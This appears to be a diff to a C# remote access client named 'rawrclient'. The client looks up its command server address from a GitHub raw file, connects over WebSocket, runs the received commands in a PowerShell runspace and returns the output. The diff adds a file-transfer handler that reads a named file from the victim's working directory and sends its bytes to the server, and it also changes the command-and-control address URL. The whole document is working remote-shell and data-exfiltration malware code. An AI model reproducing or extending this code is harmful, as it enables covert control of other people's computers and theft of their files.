@@ -5,11 +5,13 @@ using System.Management.Automation.Runspaces;
 using System.Collections.ObjectModel;
 using System.Text;
 using WebSocketSharp;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
 
 namespace rawrclient {
     public class Program {
         static bool connected = false;
-
         static string GetPSOutput(Collection<PSObject> results, bool isLocation = false) {
             StringBuilder stringBuilder = new StringBuilder();
             foreach(PSObject psobj in results) {
@@ -45,6 +47,16 @@ namespace rawrclient {
             ws.Send(toSend);
         }
 
+        static void HandleRAWRTransfer(WebSocket ws, string filePath) {
+            try {
+                byte[] byteArray = System.IO.File.ReadAllBytes(filePath);
+                ws.Send("--TRANSFER--");
+                ws.Send(byteArray);
+            } catch {
+                ws.Send("--TRANSFER--||||Error: could not find file " + filePath);
+            }
+        }
+
         static void HandleConnection(WebSocket ws) {
             Runspace runspace = null;
             Pipeline pipeline = null;
@@ -59,8 +71,18 @@ namespace rawrclient {
                     pipeline.Commands.AddScript(("cd " + '\u0024' + "home"));
                     Collection<PSObject> results = pipeline.Invoke();
                     SendCommand(ws, runspace, pipeline, "");
-                } else if (e.Data == "--TERMINATE--") {
+                }
+                else if (e.Data == "--TERMINATE--") {
                     Environment.Exit(0);
+                }
+                else if (e.Data.Contains("--TRANSFER--")) {
+                    string fileName = e.Data.Split(new[] { "||||" }, StringSplitOptions.None)[1].Replace("\n", "").Replace("\r", "");
+                    pipeline = runspace.CreatePipeline();
+                    pipeline.Commands.AddScript('\u0024' + "gl = Get-Location; " + '\u0024' + "gl = " + '\u0024' + "gl.Path" + "; $gl");
+                    pipeline.Commands.Add("Out-String");
+                    string cwd = GetPSOutput(pipeline.Invoke()).Replace("\n", "").Replace("\r", "");
+                    string filePath = cwd + "\\" + fileName;
+                    HandleRAWRTransfer(ws, filePath);
                 } else {
                     string[] splt = e.Data.Split(new[] { "||||" }, StringSplitOptions.None);
                     string msgEvent = splt[0];
@@ -84,7 +106,7 @@ namespace rawrclient {
                 Runspace runspace = RunspaceFactory.CreateRunspace();
                 runspace.Open();
                 Pipeline pipe = runspace.CreatePipeline();
-                pipe.Commands.AddScript('\u0024' + "fulladdress = IWR -Uri https://raw.githubusercontent.com/Mangio621/PenTesting123/master/rawr/rawraddr.txt; " + '\u0024' + "fulladdress = " + '\u0024' + "fulladdress.Content; " + '\u0024' + "fulladdress");
+                pipe.Commands.AddScript('\u0024' + "fulladdress = IWR -Uri https://raw.githubusercontent.com/FunkESec/Payloads/master/rawr/rawraddr.txt; " + '\u0024' + "fulladdress = " + '\u0024' + "fulladdress.Content; " + '\u0024' + "fulladdress");
                 pipe.Commands.Add("Out-String");
                 string addr = GetPSOutput(pipe.Invoke(), false).Trim();
                 runspace = null;
